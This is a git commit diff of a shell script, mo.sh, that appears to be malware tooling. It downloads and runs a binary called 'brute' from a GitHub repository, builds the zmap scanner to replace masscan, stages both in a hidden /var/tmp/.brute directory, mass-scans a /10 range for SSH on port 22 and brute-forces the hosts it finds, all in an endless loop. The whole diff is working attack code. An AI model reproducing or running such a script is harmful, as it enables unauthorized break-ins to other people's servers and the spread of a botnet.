f3db6faa0ef0460de10b9cbb4b3ccca8d6c1f061
root <atilalima569@gmail.com>
2026-07-27 18:57:33 -0500

    ok

--- mo.sh
+++ mo.sh
@@ -6,32 +6,48 @@
 
 url='https://github.com/atilabyte/golang/raw/refs/heads/master/atila'
 brute_url='https://github.com/atilabyte/golang/raw/refs/heads/master/brute'
-url_masscan='https://github.com/atilabyte/golang/raw/refs/heads/master/masscan'
+url_zmap='https://github.com/zmap/zmap/archive/refs/tags/v4.4.0.zip'
+
 wget_ok=0
-masscan_ok=0
+
+
 
 
 
 brute(){
 
+
 cd /var/tmp  ; cd .brute
-wget $brute_url -O brute || curl  -L $brute_url -o brute
-chmod 777 brute && chmod 777 masscan
-timeout   5s ./masscan -p 22   192.168.1.1/10 > ip  #50 segundos para  pega os ips
-awk '{print $6 }' ip   > ips
+
+wget $brute_url  -O brute || curl  -L $brute_url -o brute
+
+chmod 777 brute && chmod 777 zmap
+
+timeout   5s ./zmap  -p 22   192.168.1.1/10  > ips  #50 segundos para  pega os ips
+
 timeout   5s    ./brute  #50 segundos para  testa o   ip
+
 return
+
 }
 
+
+
+
 #################################
+install_zmap(){
 
-
-install_mass(){
 
 #function no critical
+
 cd /var/tmp 
-out_cat=$(cat .brute/masscan )
-if (( ! $?  )) ; then #masscan ja foi instalado
+
+out_cat=$(cat .brute/zmap )
+
+if (( ! $?  )) ; then 
+
+echo zmap ja foi instalado
+
 
 brute
 
@@ -42,34 +58,42 @@ fi ;
 
 
 if [ $EUID -eq  0 ] ; then
-apt upgrade  -y  
-apt-get install -y libcap-dev #masscan depedencia
-cd /var/tmp ; mkdir -p .brute ; cd .brute
-wget $url_masscan  -O  masscan  || curl  -L  $url_masscan  -o   masscan
- #pwd=/var/tmp/.brute
-md5=$( md5sum masscan )
-for m in $md5 ; do
-#verify md5 of masscan
-if [ $m = '97615c0b05d680ac2f39eb7abca0da57' ] ; then
-  masscan_ok=1
-fi ;
-done
+
+
+apt-get   update -y  &&  apt-get  upgrade  -y   
+
+apt-get  install  -y  unzip  ; apt-get install -y make
+
+apt-get install -y  gcc  || apt-get install -y cc
+
+apt-get install -y  build-essential  ; apt-get install -y cmake
+
+apt-get install -y   libgmp3-dev gengetopt libpcap-dev flex byacc libjson-c-dev pkg-config libunistring-dev libjudy-dev
+
+
+
+cd /var/tmp 
+
+
+
+wget $url_zmap  -O  zmap.zip  || curl  -L  $url_zmap  -o   zmap.zip #dowload zipedd   zmap
+
+
+unzip  zmap.zip ; cd zmap-4.4.0  ;  cmake .  ;  make
+ 
+mkdir -p  /var/tmp/.brute
+
+cd src ; cp zmap /var/tmp/.brute/zmap
+
+
+
 
 fi; #nao so root
 
 
 
-if [ $masscan_ok -eq 1 ] ; then
-
-echo ok
-
-return
-
-
-fi ;
 
 }
-
 
 
 
@@ -121,7 +145,7 @@ init() {
 
  
 while true ; do
-install_mass 
+install_zmap
 done
 
 
